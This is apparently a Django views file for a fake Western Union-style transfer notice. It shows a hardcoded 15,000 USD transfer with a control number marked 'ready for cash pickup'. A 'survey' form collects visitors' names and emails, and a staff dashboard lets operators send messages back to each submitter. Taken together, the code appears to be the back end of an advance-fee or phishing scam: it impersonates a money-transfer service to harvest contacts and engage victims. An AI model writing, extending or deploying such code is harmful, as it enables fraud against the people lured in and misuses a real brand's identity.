import json

from django.contrib.auth.decorators import user_passes_test
from django.core.exceptions import ValidationError
from django.core.validators import validate_email
from django.http import JsonResponse
from django.shortcuts import get_object_or_404, redirect, render
from django.urls import reverse
from django.views.decorators.http import require_http_methods

from .models import SurveySubmission, TransferReceiptTemplate

TRANSFER_DATA = {
    "sender": "Amina Yusuf",
    "amount": "15,000",
    "currency": "USD",
    "mtcn": "908 274 1164",
    "country": "United Arab Emirates",
}


def _staff_required(view_func):
    return user_passes_test(lambda u: u.is_authenticated and u.is_staff)(view_func)


def _transfer_context_from_template():
    receipt = TransferReceiptTemplate.get_solo()
    context = {
        **TRANSFER_DATA,
        "sender": receipt.sender_name,
        "recipient_name": receipt.recipient_name,
        "amount": f"{receipt.amount_sent:,.0f}",
        "currency": "USD",
    }
    return context


@require_http_methods(["GET"])
def transfer_alert(request):
    context = {
        **_transfer_context_from_template(),
        "survey_submit_url": reverse("western:survey-submit"),
    }
    return render(request, "western/transfer_alert.html", context)


@require_http_methods(["POST"])
def receive_transfer(request):
    context = {
        **_transfer_context_from_template(),
        "status": "Ready for cash pickup",
        "fee": "0",
    }
    return render(request, "western/receive_success.html", context)


@require_http_methods(["POST"])
def survey_submit(request):
    try:
        payload = json.loads(request.body.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return JsonResponse({"error": "Invalid JSON."}, status=400)

    name = (payload.get("display_name") or "").strip()
    email = (payload.get("contact_email") or "").strip()

    if not name or len(name) > 120:
        return JsonResponse({"error": "Please enter a valid name (max 120 characters)."}, status=400)

    try:
        validate_email(email)
    except ValidationError:
        return JsonResponse({"error": "Please enter a valid email address."}, status=400)

    sub = SurveySubmission.objects.create(display_name=name, contact_email=email)
    return JsonResponse({"submission_id": str(sub.id)})


@require_http_methods(["GET"])
def survey_status(request, submission_id):
    sub = get_object_or_404(SurveySubmission, pk=submission_id)
    msg = (sub.admin_message or "").strip()
    if msg:
        return JsonResponse({"ready": True, "message": sub.admin_message})
    return JsonResponse({"ready": False})


@_staff_required
@require_http_methods(["GET", "POST"])
def survey_dashboard(request):
    if request.method == "POST":
        sid = request.POST.get("submission_id")
        message = (request.POST.get("admin_message") or "").strip()
        if not message:
            submissions = SurveySubmission.objects.all()
            return render(
                request,
                "western/survey_dashboard.html",
                {
                    "submissions": submissions,
                    "error": "Please enter a message before sending.",
                },
                status=400,
            )
        sub = get_object_or_404(SurveySubmission, pk=sid)
        sub.admin_message = message
        sub.save(update_fields=["admin_message"])
        return redirect("western:survey-dashboard")

    submissions = SurveySubmission.objects.all()
    return render(
        request,
        "western/survey_dashboard.html",
        {"submissions": submissions},
    )


@_staff_required
@require_http_methods(["GET"])
def receipt_template_preview(request):
    receipt = TransferReceiptTemplate.get_solo()
    context = {
        "receipt": receipt,
        "edit_url": reverse("admin:western_transferreceipttemplate_change", args=[receipt.pk]),
    }
    return render(request, "western/receipt_template_preview.html", context)
